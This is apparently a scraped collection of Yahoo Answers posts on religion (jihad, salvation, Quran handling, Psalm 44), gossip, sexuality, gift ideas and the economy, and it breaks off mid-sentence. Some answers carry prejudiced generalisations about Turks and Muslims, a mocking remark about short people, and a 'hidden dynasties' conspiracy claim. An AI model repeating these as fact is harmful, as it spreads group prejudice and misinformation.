ae66b1407392b526977b195515f98f66aa	So one thing I've noticed about this section is that bisexual teens ask a lot of questions revolving around why they prefer guys for one thing, girls for the other and if its wrong for them to feel that way. Like I tell them, its tottttttttttttttttttttally (note the 20 't's between o and a) okay to like one sex in a different way than the other. I mean, I'm gay and I've fallen for FtoM males for reasons that differ from when I've fallen for non trans males and I'm totally okay with not being able to comprehend them. One day you'll find a person that is so amazing that you'll care less about the reason behind liking them =D.    And I'm not sure if any sexual act would have that effect on you. I've watched my fair share of porn (no shame >=D!) and some of it does nothing for me. Then there's the things that I only get into on occasion *cough*.

6ec6afa27ccfe7badb1528fec2817bfcaa	ok (grin), your spelling and punctuation need some improvement, but I doubt that was the reason you put your question in the languages section..  Why do people gossip?   1. Gossip almost always is about bad things.. it makes the gossipers feel better about themselves: ("he cheated on her" implies he is a bad guy, and I am a much better person, being in a position to judge him).   2. Gossip is sort of "exciting" (have you heard????), so no matter if the "news" is true or not, it's a topic of conversation, and it spreads quickly, especially in a place like school where many people are meeting on a regular basis.  3. Of course it's easier to gossip about someone who is not there, and who cannot defend himself..  4. In case there is some "mystery" (why was this person suddenly suspended???) people will think up "a reason", and even when they  talk about it as a possibility ("I don't know, there must be some good reason, who knows he stole something"), the next person will make things worse telling someone else "I heard he possibly stole something", the next one will say "he stole something", and then it sounds like a fact...    So.. sorry for your friends, but this is how it works.. Not nice huh? All you can do is contradict any untrue gossip you heard, and refrain from judging people and from joining any gossip yourself...

0fEBJinjaa	Yeah, I know what it means. Jihad means to "strive" or "struggle".

The trouble I have is that I thought Islam was a religion of peace, not violence. So why do some feel that they can apply the word meaning to a different concept and take it to the next extreme with it? I interpret the meaning to be that it's a struggle with oneself against evil in the personal sense. I can see where the meaning fits, but from what I remember being taught, that my teacher said that jihad can be used for personal means. It's the same concept as why the Holy Wars back in the early days were so unjustified; as the Catholics sent people on Crusades, which is the same kinda idea; using religion to your advantage.     As jihad pertains to today's war, I realize that America is the bad guys in this war, our government did a wonderful job at keeping us in the dark about everything. I've seen a number of documentaries that show that we are in Iraq (I just using this to mean anywhere in the Muslim world that we have invaded for no reason) for someone's personal agenda and not for what we, as citizens, were told. We just came in, took over and clearly took advantage of Iraq in a bad way. We took out the dictator to make people here at home think they love us there, but now I think America got into a bigger mess than it was originally intending, but maybe not.    So no, I am in no way biased towards any Muslim person. They have a right to feel angry with the way America has handled itself, but in no way can you blame just any American citizen, you must blame the government as they are the ones in charge of these decisions.    I just see it as possibly a way of using religion to your own means, but I do agree with you on where the meaning can clearly and literally fit, not just making it fit to your advantage. To each his own, everyone has their own level of tolerance. I wouldn't have any if someone invaded my country and disrupted my life for their personal gains. So although I am fully a supporter of our troops I can support the poor muslim people dealing with being "raped" in the figurative sense, we have pretty much destroyed Iraq and for what, nothing but for giving millions of people a horrible situation to deal with. War is not a good thing to have to deal with, but it will never go away.      Sorry to rant on about that, I feel that the word jihad and the war in Iraq can go hand in hand for good debate. Good question, really got me thinking, sorry if it wasn't really what you were looking for. =)|`|P1Sl55Coaa	Yes, it means struggle.  But, the religion's book does say to make slaves of infidels.

9mLjDa5kaa	The truth is that death brings IMMEDIATE heaven or hell, depending ONLY on whether you believed the truth about Jesus in this life or not.     So to be in heaven and not hell, believe the truth about Jesus now! :)     Only faith alone in Jesus saves! Salvation is a FREE GIFT that happens in a split second when you believe in Jesus! It is impossible to lose or "leave" salvation.     The truth about Jesus is that the only way to be saved and to get into heaven and avoid being sent to eternal hell, is by believing in faith alone that Jesus, who is God, died for our sins on the cross as FULL PAYMENT for our sins, and then Jesus rose from the dead (1 Corinthians 15:1-4). Believe this and you will be in heaven, no matter what!     Please pray now: "Jesus, please forgive me of my sins. I believe that You died on the cross for my sins and You rose from the dead. Thank You for eternal life!" You will be in heaven with Him forever when you die. :)|`|Ma10Exocaa	To the crematorium.|`|5tMCDu8gaa	Into the ground to be eaten by worms.|`|J7KSKm54aa	Where ever I am sleeping when I decide to go back Home.|`|8ubAwaGCaa	Either to Paradise or to Prison.

3aVxJYf6aa	Ok....Does It Matter Which Religion You Choose?    MOST of us like to have a good selection to choose from when we go shopping. When a market offers a variety of fruits and vegetables, we can select the ones that we most enjoy and that are good for our family. If a clothing store offers many affordable styles and colors, we can choose what best suits us. Some of the choices we make in life are merely expressions of individual taste. Others, though, affect our well-being, for example, our choice of healthful food or wise friends. So, what about our choice of religion? Should our way of worship be merely an expression of personal taste? Or is it a matter that seriously affects our well-being?    There is a great variety of religions from which to choose. Many countries now guarantee freedom of religion, and people feel increasingly free to leave the religion of their parents. A poll in the United States found that 80 percent of Americans believe that more than one faith can be a path to salvation. According to that same poll, one out of five respondents said he had switched religions as an adult. A survey in Brazil revealed that nearly a quarter of all Brazilians have changed their religion.    In the past, people would furiously debate the doctrines that distinguish one religion from another. Now the popular view is, It does not matter which religion you choose. But does it? Can your choice of religion affect you?|`|6lJuKKMHaa	Try    Notreligion.com       instead.  |`|tEn2nnsuaa	http://en.wikipedia.org/wiki/List_of_rel...|`|59dd5008296ef156d8a7982658c3dc82aa	Islam: http://www.islamreligion.com  Judaism: http://www.jewfaq.org  Hinduism: http://hinduism.about.com  Buddhism: http://www.buddhaweb.org    Enjoy and have fun learning!|`|dNSvlc6caa	Yes I agree with Robin, I like religioustolerance.org.

The term "Wahhabi" is a slanderous term, used to attack Muslims who believe in following the Noble Qur'an and the Sunnah of Prophet Muhammad, peace be upon him, with the same interpretation as the Companions of the Prophet, peace be upon him, and the scholars throughout Islamic history who also followed this way. For more information, see the book's website at http://www.thewahhabimyth.com/ , inshaa-Allaah the read will be quite beneficial and insightful.    ----  ABRIDGED EXCERPT from "The Wahabi Myth"    What is a Salafi and What is Salafism?    The reader will notice that the word "Wahhabi" is always indented with quotation marks here at http://www.theWahhabiMyth.com. Those who are labeled with this word do not themselves use this term, as it is used as a means of belittlement. The reasons for the rejection of this term are clearly outlined throughout this book. The correct way of referring to them is by terming them "Salafis", as they are those who adhere to the way of the "Salaf" - the Prophet Muhammad (may Allah raise his rank and grant him peace) and his companions.    Following the way of the Salaf is the way which has been legislated in the Quran and Sunnah, the very sources of Islam. The Prophet (may Allah raise his rank and grant him peace) said to his daughter Fatimah: "Indeed, I am for you a blessed Salaf." (1)    When asked about which was the correct and acceptable way of understanding Islam, the Prophet (may Allah raise his rank and grant him peace) replied by saying: "That which I and my companions are upon." (2)    Similarly, Allah says in the Quran that He is pleased with the companions "and also those who follow them exactly (in faith)." (3)    As such, He said regarding the Prophet (may Allah raise his rank and grant him security) and his companions:    "So if they believe as you (i.e. the Salaf) believe, they are indeed rightly guided." (4)    All of the orthodox scholars of Islam followed the way of the Salaf in understanding religion. Early scholars such as Imam al-Awzaa'ee, who died 157 years after the Prophet's emigration to Medina, said: "Be patient upon the Sunnah, and stop where the people (i.e. where the Salaf) stopped, and say what they said, and refrain from what they refrained from, and follow the path of your righteous Salaf; for verily, sufficient for you is what was sufficient for them." (5)    Today, one of the famous Sunni schools of jurisprudence is named after a scholar named Abu Haneefah. Millions of Muslims all over the world ascribe themselves to his school of jurisprudence; those who the media would term "mainstream" Muslims. Regarding adherence to the Salafi methodology, he said, "Adhere to the narrations and way of the Salaf, and beware of newly invented matters (in religion), for all of it is innovation." (6)    The media claim that Salafis/"Wahhabis" believe that all those who do not follow their form of Islam are "heathens" (10) is a tall tale. Salafis believe that those Muslims who do not follow the understanding of the Salaf are not adhering to these and other clear texts. As such, they do not fall under the above-mentioned Quranic verse as being "rightly guided." Salafis distinguish between those who fall into religious innovation and those who fall into disbelief.    When considering the proofs which are contained within the Quran and Sunnah and the statements of all the orthodox scholars of Islam from the earliest generations to the present time, it becomes obvious that it is a great blunder for the media to refer to Salafism as being a new movement called "Wahhabism" which came about only two centuries ago during the time of Muhammad Ibn Abdul-Wahhab in Saudi Arabia.    "So after the truth, what else can there be, save error?" [Quran 10:32]  --------    ADDITIONAL NOTE:  For anyone interested in learning more, I encourage you to actually read the treatises of Shaykh Muhammad ibn Abdul-Wahhaab. Many of them are relatively short and amazingly beneficial. One would be hard-pressed to find anything from his essays calling to extremism. Rather, much of his work is simply about educating the common Muslim in the basics of Islamic Monotheism.

The Turks may have become secular under Ataturk and they provide a model there but it doesn't mean they aren't bloodthirsty. If you don't believe me just look at how they treat the Kurds.

zgL6vMCiaa	those are explanation:  http://www.islam-qa.com/en/ref/2564  http://www.islam-qa.com/en/ref/60213    and this about how touching it:   http://www.islam-qa.com/en/ref/70403  Praise be to Allaah.   It is not permissible for anyone who does not have wudoo (whether they are menstruating or otherwise) to touch the Mus-haf according to the majority of scholars, because the Prophet (peace and blessings of Allaah be upon him) said: No one should touch the Mus-haf except one who is in a state of purity. Narrated by Maalik in al-Muwatta, 468; classed as saheeh by al-Albaani in Irwa al-Ghaleel, 122.   A menstruating woman may recite Quraan without touching the Mus-haf, according to the most correct view, such as if she recites what she has memorized, or if she holds the Mus-haf with a cloth and the like. She may also read from a Quraan that includes commentary, as is explained in the answer to question no. 2564, 60213.   You should have avoided touching the Mus-haf directly, and held it with something that would have formed a barrier, such as a clean cloth, or worn gloves, or turned the pages with a stick or pen and the like.   And Allaah knows best.  Islam Q&A|`|hMygg8cnaa	i held the quran in my  hand the other day  and read it  after having had sex  and not taking a full-body  shower.    i didn't feel like  washing my hair  twice in one day.    so...    now what?    is allah going  to twist my head  backwards?    edit--  how does having sex  make me a dirty tramp?|`|hfAsEiaZaa	I believe as long as shes not touching an actual Kitab..she can read it online=]      i read online when im on my period..so yeah|`|faNLFzwmaa	In Surah Waqiya, it is stated that the angels or the pure touch Allah's book. Why do Muslim women not pray while on their dot? Because they are in a state of impurity. Therefore, if the Quran says be pure to touch it, than it is hand in hand that NO TOUCHING QURAN WHEN ON THE DOT!    BTW, I find it interesting (to say the least) that your sis was open enough to tell you about her "visitor".|`|kkO87h0Xaa	Does no one else know how to read the Qur'an? Can't they wait until she has finished menstruating?    Why don't you read it?    She is allowed to read it, as long as she doesn't touch the Qur'an, and reads it FOR others, I believe. She can listen to the Qur'an being recited, and she can read it for herself during her own time, but I don't think she would be able to read it aloud to others.     *I am basing this on the fatwa that says women cannot pray while menstruating, and when praying, we recite Qur'anic verses. So, it must be forbidden during menstruation.|`|8pKyzuy3aa	She can definitely read it online, but she can not hold the Quran and read it.   In my Sunday school classes (musjid classes, where we read the Quran and memorize/recited parts of it), our hafiza teacher told us that a girl who has her menstrual period may hold the Quran if she wears gloves...so there was this girl that wore gloves to the class whenever she had her period.    I think it is funny that the brother and grandfather know that the sister has her period.|`|AA11791540	all i know is only those who are clean can touch the Quran. regarding reading it online or listen to it, i have no knowledge of it.|`|sDdp3RBpaa	umm did ur sister actually tell u she had her period o_O ok then..........|`|CQz8dMzFaa	I dont really know...but I have an online version, which I usually keep for comparative study..and I read it now and then when I'm on my period...but very rarely.

HhmhSBpgaa	I know it can be confusing at first looking to do whats right. I think its awesome that you are that ambitious to do the right thing. If it were a sign then God would lay it upon your heart. The same feeling you got when he called you to come to him. God will open so many doors for you I know its overwhelming but he wants us to be happy and to prosper ( not just financial ) Just pray for his guideance and as you read the bible more you will soon know his guiding touch he will lay it upon your heart. I will be praying for you.|`|97oxJ0B8aa	I don't know if the spider is a sign, but Psalm 44 will likely soon be something that can be said of America because we have so similarly walked in the steps that Israel did prior to their ruin and exile.    On another note, the spider is a symbol of (if anything) persistence and industry. (based on a proverb)  So maybe the spider would be to remind us that our fall will be due to the devil's diligence, or our lack of it.|`|tDmemV5yaa	I use the Amplified Bible with notes by Joyce Meyer and I think that this passage is about shame.  If you keep reading the whole passage, in verse 15 it says; "my dishonor is before me all day long, and shame has covered my face."  So to me, the writer, (Korah), was for some reason complaining about what the people before him had, and he didn't.  Meyer makes this note: "But when an individual is rooted in shame, it affects his entire life.  He is doomed to failure becuase he has no confidence.  Jesus bore our shame for us on the cross."  Ask Him to heal you so that you can live free from shame.  No, spiders like to live around heat sources, so he was probably waiting for you to go to bed so that he could snuggle up.|`|TwfyliKiaa	I think that  psalm was talking about when God rejected His people for the evil they refused to repent of.

If you really want to know God intimately I recommend that you study with Jehovah's Witnesses, they will be more then glad to help you.|`|VRl1jENHaa	Read Deuteronomy 28:15-68; it details all of the curses that God vowed would happen to the Jewish people if they were disobedient.  When you compare the tragedies listed within verses 9 - 12, you'll see that all of them are contained within the Deuteronomy list.  For example, "you sold you people for a pittance gaining nothing from their sale" is a fulfillment of Deut. 28:68, which reads:    68 And the LORD will take you back to Egypt in ships, by the way of which I said to you, You shall never see it again. And there you shall be offered for sale to your enemies as male and female slaves, but no one will buy you.    History records that all these curses were poured out onto the rebellious Jewish people, who worshipped other "gods" and turned their backs on the One, true God.  So this Psalm was written by a "son of Korah" (a prophetic Jewish songwriter), who was experiencing the anguish of God's wrath upon his people.    As for the spider, perhaps it's a coincidence.  I'm really not sure.|`|diQ0oodqaa	Had to smile at you and your spider.........    I used to open my Bible at random when I was first a Christian just to see if I would get a message. Sometimes it works, sometimes it makes no sense at all. My best answers are telling Him in my prayers what I am wondering about and ask Him for an answer. Somehow I always get it, maybe not right away but I know it when it happens.    I went back and read Psalms 44, and from your description of yourself and your soon planned trip, I still don't see a message other than the writer is asking God for redemption. We have redemption already, Jesus gave us than on the cross.|`|mrjRPHzTaa	It's a bad idea to just open a bible and think that God has lead you to a scripture. What would you of done if you had turned to where Judas hanged himself? Exactly why you shouldn't do it.    It's a coincidence.|`|SbN2cXE5aa	If this was a "sign" just for you, then God will reveal this too you.    God's word is a "SIGN" for everyone, to be in His word, and learn about our heavenly Father.     He spoke in parables to those that did not have ears to hear.|`|PSkHc7h6aa	Psalms 44:9 "But Thou cast off, and put us to shame; And goest not forth with our armies."    Sure God was with them where ever they are and go, but Father doesn't give us the victory like we once had. The military men and women fought and did a mighty good job, and though we may have won the war, we lost for other reasons.    Psalms 44:10 "Thou makest us to turn back from the enemy: And they which hate us spoil for themselves."    This is exactly what they do, they that cause this world confusion and trouble spoil for themselves through their conspiracy. That conspiracy is very real even in our land of America, as the effects come upon us in many forms; in our homes, our schools, at the strore where we buy our goods, and even to the higher levels of Government. As the nations of the world move into this one world control, our people still have no idea what is really going on for they are not familiar with God's plan through His Word. They have no hint of the four hidden dynasties that are in control of the direction that the world is heading into. They don't know what they want, but sit back and take what is offered to them. Most people today have no idea what brings true peace of mind to their daily lives.    Psalms 44:11 "Thou hast given us like sheep appointed for meat; And hast scattered us among the heathen."    This has already taken place as God's people have been scattered around the world. Hosea tells us of them in Hosea 1:10; "Yet the number of the Children of Israel shall be as the sand of the sea, which cannot be measured nor numbered; and it shall come to pass, that in the place where it was said unto them, "Ye are not My People,' there it shall be said unto them, `Ye are the sons of the living God.' "    The sheep of the true House of Israel [the ten tribes] has been scattered all over the earth, and formed into many nations by many names. We know that the House of Judah, or Jews, are a very limited number, and today occupy the nation of Israel, as well as in other nations, yet Hosea tells us that this house of Israel will be so large that it simply cannot be counted, "like the sands of the sea". However their identity will be known by what they call themselves; "...there is shall be said unto them, `Ye are the sons of the living God'. The living God is Jesus Christ, and they will be known as Christians and Christian nations.    Psalms 44:12 "Thou sellest Thy people for nought, And dost not increase Thy wealth by their price."    God is allowing this selling of His people to happen, and yet He does not step in to stop the conspiracy by the leaders of these four hidden dynasties. There is a purpose of all this that is happening, for it is fulfilling certain parts of God's plan. One worldism is becoming a reality, and is part of our everyday life today. However the complete forming of the one World system will not be completed until the arrival of Satan in his role as the "instead of Christ" [the Antichrist].|`|db7df25ea31227e5641d5c32d43c3bcdaa	its a lament of how God punished Israel when they disobeyed.    Psa 44:9  But you have cast off (Israel), and put us to shame; and goes not forth with our armies (to fight for us).   Psa 44:10  You make us to turn back from the enemy: and they which hate us spoil (us) for themselves.   Psa 44:11  You have given us (up) like sheep appointed for (to be killed for) meat; and have scattered us among the heathen (nations).   Psa 44:12  You sold thy people for naught (or nothing), and do not increase thy wealth by their price.       Israel of old was punished by God for rebellion.  Their enemies would steal their belongings and food.  Their enemies would sometimes take them captive and remove them out of their land.|`|L0jeEhChaa	Being a Christian and reading your Bible is supposed to be about developing your personal relationship with God. Pray about it, if it's something specifically for you He will let you know. The more you seek Him out and stay in the word, the more you hear from Him.    Here's a commentary on Psalms 44 http://www.christnotes.org/commentary.ph...
RN0zRPH4aa	well.  Catholics believe in doing penance and praying to Mary and such.  Baptists are more old fashioned and strict in their beliefs, but besides that they are contemporary Christians.  Jehovah Witnesses are considered by many to be a cult.  I don't know a lot about the denomination so I'm not going to say things about them that I've heard from others outside of the denomination, not knowing whether it's true or false.  To me personally it seems like they're somewhat like the Amish people, except more modern.    P.S. We all serve the same God, it's just that we all serve in somewhat different ways.  The Bible is interpreted in many different ways, which is why there are so many denominations.  I think that we'll be surprised when we get to heaven and discover the fullness of who God is.  I'm sure that no denomination has it all down pact, and chances are you'll find small things you don't agree with in every church.|`|qISyfB4Xaa	They all wear different hats.

(Pope John XXIII)    Almost all important doctrine is completely agreed upon between Catholic Christians and other Christians.     Here is the joint declaration of justification by Catholics (1999), Lutherans (1999), and Methodists (2006):    By grace alone, in faith in Christ's saving work and not because of any merit on our part, we are accepted by God and receive the Holy Spirit, who renews our hearts while equipping us and calling us to good works.    http://www.vatican.va/roman_curia/pontif...    There are many minor doctrine issues and some major cultural traditional differences which, I believe, do not matter that much.    A Catholic worships and follows Christ in the tradition of Catholicism which, among other things, recognizes that Christ made Peter the leader of His new Church and Pope Benedict XVI is Peter's direct successor.

uNu7b21baa	The Quran says that the devil tempted both Adam and Eve to sin and they both fell into temptation. (it doesn't put the blame solely on Eve nor put "painful childbirth" as a punishment. They were kicked out of the garden for their sin. But we cannot inherit their sin (as christians call "original sin". Everyone is responsible for his or her own sin it wouldn't be fair to but blame on a baby that never did their deed. After they left they repented for their sin and were forgiven and when they died returned to paradise. This sets the pattern for forgiveness in islam. In Islam believe in original forgiveness rather than original sin. That we all are responsible for our own actions and what we do.     We are all essentially living now in this lower dunnyah (life) which is a test from Allah. If we submit to God to the best of our ability and do good deeds our sins will be blotted out by the mercy of Allah (swt) just as were Adams (peace be upon him).|`|dZz22FJOaa	Hijab Kitty is right and her answer is perfect.|`|i1t6vxe5aa	Peace!

I am the servant to..... and I threw the thing across the room and never touched one again.

Me, her, and a few other friends went over to the school graveyard. The first attempt, nothing. But, the second time we tried, we thought it might have been the wind moving the letters around. When the wind subsided, we knew it wasn't the wind's fault. All of a sudden, my friend fainted. We got really scared, and we all ran away, forgetting about my unconscious friend... a few days later, we found out that my friend's body was found at that same graveyard... ever since, I haven't used an ouija board.

AM7CgQ4daa	I have 2 ideas  A nice silver pen with an engraving that would mean something to both of you, maybe a nickname or something  Or, you can get friendship necklaces that you break in half, and you both keep one half and wear it.  They normally come in a heart shape, so when broken you get part of the heart.|`|wQSzuANEaa	Make him a video of you and him. Good time together. Make the video funny, sensitive, thoughtful, and loving. A good home made video is always great. Play one of his favorite songs on the background of a certain part of the video or somethin. Just make it creative. You can give him that with a video camera so that he can capture his time at college and share that with you guys when he comes back to visit. Honestly... I think this is a great set of gifts. A heartfelt video that will bring lafter and happiness and a totally awesome camera. Make sure you get him one that is really awesome.
LCdOocBAaa	Yeah, anyone under 5'2 i consider a midget.|`|Um7mYM71aa	no.|`|4tFuosueaa	Do you laugh when you see other people who are different from you?  They are called "little people' or "dwarfs".

Some of them find the term "midget" insulting.|`|7d562e4c2cec8f112f595c590a17a6b3aa	It's not very nice to laugh at those who may be different physically. All humans are beautiful. We must treat all people with respect and dignity. That's the same way we would want to be treated.    Next time you see that man, please have some compassion and say hello. I know you can do it because you're nice.
klBuVAXIaa	get her a camera and takes some pictures of you with it, holding a sign or something that says I love you.|`|Nl64RmRWaa	Depends... Does she REALLY like taking pictures? If she was constantly using her old camera, and is upset over ruining it, then definitely get her a new one. Get her a special card and something small like chocolates or flowers to go along with it. If she has the camera just to have one, and doesn't use it all that often, then go for something else. A rose dipped in gold is a very romantic gift that I'm sure would make her smile.|`|Y5RJLkG7aa	get her a camera and maybe a cheap bracelet and put in the camera case and then buy her some flowers or skip the bracelet and get her a box of chocolates a camera and put the camera in the box of chocolates and with 12 red roses!|`|OR1nkXhDaa	Have you thought about Fair Trade?

Fy9Muy6Waa	it will never happen   I suggest you learn how to survive on nothing- how to make things yourself- learn to grow food, how to make soap, how to hunt and process the meat, how to make leather, how to sew, etc- for survival when it gets down and dirty before too long- we wont be able to rely on all of our electrical things when we dont have money to pay the electric bills- learn to do home canning|`|3RQkgTSOaa	Not many. People don't even know how to save for their own retirement let alone the intricacies of national and international markets. Too many people in this country have come to expect others to do things for them. They expect the government to take care of everything. No offense to the people of New Orleans but they would have been better off handling the whole Katrina mess themselves. And I say that because (1) THEY are the ones who live there and know what needed to be done and (2) the government came in and simply screwed it up. They simply should have said to GWB: "Thanks for coming but just give us the money and go away. We'll handle this."    This country has invested WAY too much trust and faith into the government and needs to wake up, srtip the government of all the unnecessary crap that they SHOULDN'T be handling, strap on a pair, get off their butts and DO SOMETHING. God helps those who helps himself, not the whiny couch potato who blames everyone else for his problems and poor standards of health and living.    Granted, programs like social security and MediCare are GOOD IDEAS as long as those who DON'T need it DON'T abuse the system by going on the government dole anyway. But it seems that this country is full of people who demand something for nothing and that will only go so far before the financial and resource coffers go bankrupt.|`|VPNP5Irfaa	I beg to differ.  We are not heading for another depression because the government now knows how to successfully intervine with the economy to avoid a depression.      While the economy is horrible right now, we are by know means close to a depression.  Our economy is a nightmare and we are in a recession, but we will come out of this even stronger than before.      Also, we are not the only ones feeling these economic problems.  Every country around the world is starting to struggle economically, even large exporters such as China.  So our country is not going to fall apart any time soon.

You could make him either a heart-shaped cake, cupcakes, or cookies and frost them with cute hearts or an "I love you". Or, you could go to Mrs Fields and get him one of those big heart-shaped cookies. They have Valentine's Day ones that are cute. Another idea would be to get him chocolate covered strawberries. Those are delicious and romantic! Something else that'd be nice is a Coldstone icecream cake, and you could get something personalized on it.    Get some chocolates, and a special card to go along with whatever you get. In the card you could write the 12 main reasons why you love him.|`|OR1nkXhDaa	Have you thought about Fair Trade?

Make sure it's red or has hearts or something. On one of your beds, depending on who's house, make a giant heart out of roses or petals, soemthing like that. Then lie down in the middle, wait for him to see you, and let the fun begin.    If he is shy, and you two don't kiss or make out alot, or talk much. Talk to him, and really get to know alot more about him, then somehow, turn the topic into you wanting him. Crawl on top of him, and lean over his face and say, "I want you for Valentine's Day." This would be great if he asks you what you want.    Basics:    A CD of a band he likes or one he wants.    A watch.    Colonge.    Shirts that he will actually wear.    A boxed TV show set he likes, or a couple of good DVD's.    Something you made, like a platter of cookies, with a teddy bear.    A stuffed animal, with a talking card.

Without any one of those, there would be no life for any of us.... full stop.    If you mean in a spiritual sence, then we are God. We are not a physical being with spirtual aspirations. We are a spiritual being who's frequency has become dense enough to solidify into mattter.    The concept of seperation is the illusion of our ego's. All matter is energy vibrating at a particular density that is part of the same universal consiousness. That includes us.      Energy can not be destroyed it just changes and continues indefinately.

Suggestion: Should we put what we believe in the sources box, since its left empty most of the time|`|FGcwxZz0aa	Catholics believe that all of their works are produced by God. Once saved, always saved is a kind of lawless salvation where there is really no true sanctification but a covering up of a filthy sinful soul in the belief that it can sneak into heaven under the guise of holiness instead of actually having been sanctified and created anew. When one studies Scriptures, instead of using the Scriptures as a group of proof texts to support ones fleshly desires, misunderstanding of Gods Word is less likely and false teaching is not promulgated. We should be more like the Bereans in not trusting those who are teaching us so that we will not fall for false teaching such as OSAS.    I know all the verses used to support lawless soteriology views. In view of contradictory Scripture how can a Calvinist support or justify their views. Allow me to illustrate what I mean with the following:    All through both Testaments of the Bible we are warned of the dangers of sin and that sin will separate us from eternity. The earliest verses making this point are as follows.    (Gen 2:16 DRB) And he commanded him, saying: Of every tree of paradise thou shalt eat:    (Gen 2:17 DRB) But of the tree of knowledge of good and evil, thou shalt not eat. For in what day soever thou shalt eat of it, thou shalt die the death.     If we examine verse 17 we see a striking similarity between hat Satan taught and what is taught by those teaching OSAS. They preach that we simply eat of the fruit of emotional ascension to faith for a moment in our lives and our consequent sins will not condemn us. Here is what the prophet Ezekiel says about a righteous man and see if it sounds like the righteous are guaranteed eternal security    (Eze 3:20 DRB) Moreover if the just man shall turn away from his justice, and shall commit iniquity: I will lay a stumblingblock before him, he shall die, because thou hast not given him warning: he shall die in his sin, and his justices which he hath done, shall not be remembered: but I will require his blood at thy hand.    (Eze 18:24 DRB) But if the just man turn himself away from his justice, and do iniquity according to all the abominations which the wicked man useth to work, shall he live? all his justices which he hath done, shall not be remembered: in the prevarication, by which he hath prevaricated, and in his sin, which he hath committed, in them he shall die.     The same teaching is repeated by St. Paul in His letter to the Romans lest one say that this prophecy only applies to the OC    (Rom 8:13 DRB) For if you live according to the flesh, you shall die: but if by the Spirit you mortify the deeds of the flesh, you shall live.    (Rom 6:16 DRB) Know you not that to whom you yield yourselves servants to obey, his servants you are whom you obey, whether it be of sin unto death or of obedience unto justice.     St. Pauls teaching is full of warnings against lawlessness and false security regarding our salvation as well as the teaching of St. James.    (Gal 5:19 DRB) Now the works of the flesh are manifest: which are fornication, uncleanness, immodesty, luxury,    (Gal 5:20 DRB) Idolatry, witchcrafts, enmities, contentions, emulations, wraths, quarrels, dissensions, sects,    (Gal 5:21 DRB) Envies, murders, drunkenness, revellings, and such like. Of the which I foretell you, as I have foretold to you, that they who do such things shall not obtain the kingdom of God.    (Gal 6:8 DRB) For what things a man shall sow, those also shall he reap. For he that soweth in his flesh of the flesh also shall reap corruption. But he that soweth in the spirit of the spirit shall reap life everlasting.    (Gal 6:9 DRB) And in doing good, let us not fail. For in due time we shall reap, not failing.    (Jam 1:14 DRB) But every man is tempted by his own concupiscence, being drawn away and allured.    (Jam 1:15 DRB) Then, when concupiscence hath conceived, it bringeth forth sin. But sin, when it is completed, begetteth death.    (Jam 1:16 DRB) Do not err, therefore, my dearest brethren.     We know that both St. Paul and St. James were speaking to and about believers as St. James confirms in the following verses lest there be any doubt.    (Jam 5:19 DRB) My brethren, if any of you err from the truth and one convert him:    (Jam 5:20 DRB) He must know that he who causeth a sinner to be converted from the error of his way shall save his soul from death and shall cover a multitude of sins.     Jesus taught of the necessity of keeping the Word and of the consequences of not keeping the Word once received..    (Joh 8:51 DRB) Amen, amen, I say to you: If any man keep my word, he shall not see death for ever.    (Joh 11:25 DRB) Jesus said to her: I am the resurrection and the life: he that believeth in me, although he be dead, shall live:    (Joh 11:26 DRB) And every one that liveth and believeth in me shall not die for ever. Believest thou this?    (Luk 8:13 DRB) Now they upon the rock are they who when they hear receive the word with joy: and these have no roots: for they believe for a while and in time of temptation they fall away.     Now, those teaching the false doctrine of OSAS will defend their views with saying that those who continue in lawlessness never were saved to begin with and it was a false eternal security that they received. The Bible clearly contradicts such a belief because it states that those who fell away were believers..    (Act 17:11 DRB) Now these were more noble than those in Thessalonica, who received the word with all eagerness, daily searching the scriptures, whether these things were so.    (Act 17:12 DRB) And many indeed of them believed: and of honourable women that were Gentiles and of men, not a few.     Even St. |`|AA10421008	Even if you're a born again Christian you can't live in sin your entire life and expect to go to heaven, but as long as you repent of your sins daily and do your best to live a Holy lifestyle God is not going to take your salvation from you. We all make mistakes. If you were a true unregenerate sinner you wouldn't even feel bad about what you've done wrong. God loves you with an everlasting love. He doesn't want to lose you for any reason. That's why He sent Jesus. Have a good and peaceful night!|`|7ufheV16aa	Yes. You can lose it by entering unrepented mortal sin. I think there might be more to this, but I'm not quite sure, so check out the Catholic Catechism.|`|nIu8zVkXaa	No, salvation is for all.  However, we who partake of the Salvation of Jesus Christ are in a continual process of being saved.  The salvation is not complete until we are perfected and become holy.  Then and only then are we fully saved.  We become perfected only after Jesus Christ comes back to earth for His bride, the Church.|`|8ubAwaGCaa	Yes.  Human beings are peccable until they are dead.|`|97oxJ0B8aa	John 3:18.  Yes.  Salvation is conditional upon believing.  The question then is, can you stop believing?  And see why Paul tells you to "Fear" in Romans 11:20.  Pray about it.  People will disagree, but it's vital to know the truth because "evil communication corrupts good manners"  That literally means that someone telling you a lie can lead to you sinning, so be careful.|`|2Hot9EJiaa	"No one can snatch you out of His hand".  If you truly confessed and repented of your sin, and accepted Christ as Savior, you cannot lose your salvation. However, that said, we must do things that would displease the one that came to save us either, that would make grace cheap.  IT is free but not cheap- it cost Christ His life to pay for our eternal salvation.|`|9mLjDa5kaa	It is IMPOSSIBLE to lose or "leave" salvation (John 6:39-40, 1 John 5:13).  Jesus paid for ALL SINS past, present, and future, on the cross.  Jesus is FULL PAYMENT for all sins.     If you think you can lose or "leave" salvation, then you aren't saved at all. Because Jesus gives ETERNAL life, not "temporary" or "probationary" life. So if you think you can lose it, then you don't have it at all. What you have is a false gospel of works, and no false gospel will get you into heaven (Galatians 1:6-9).     In other words, until a person believes that what he has received from the Lord Jesus is permanent and cannot be lost, he is not yet born again. A person cannot believe in Christ alone for his eternal destiny and also believe that he must do something (or avoid doing something) to keep it.|`|g4AAZRuxaa	Some teach you can't but the Bible does say some do not inherit the kingdom of God so yes I believe that it is possible.|`|WjRqYf6naa	Absolutely, positively not. But if you think that as a believer you can continue in gross sin and not be punished by the Lord in some way, you are gravely mistaken. God disciplines His Children.    Hebrews 12:6-8 (ESV)  For the Lord disciplines the one he loves, and chastises every son whom he receives."  It is for discipline that you have to endure. God is treating you as sons. For what son is there whom his father does not discipline? If you are left without discipline, in which all have participated, then you are illegitimate children and not sons.|`|um9W8Dy8aa	Not like loosing your eye glasses  Salvation cannot be 'misplaced"  but since we have free will and accountability for cooperating with grace  and since love can only be freely given  we can evict God Almighty and Infinite from our lives by mortal sin unrepented    I can't see how Once saved Always saved is consistent with the new testament.  I am familiar with words and passages pulled out of context but  itis contrary to moral health of soul(since I can do any great evil i want ans stillget my palace up above)  for Heaven is not primarily a place but union with the All Holy and All Just and All Good and All Pure God  and it is contrary to the attributes of god such as All 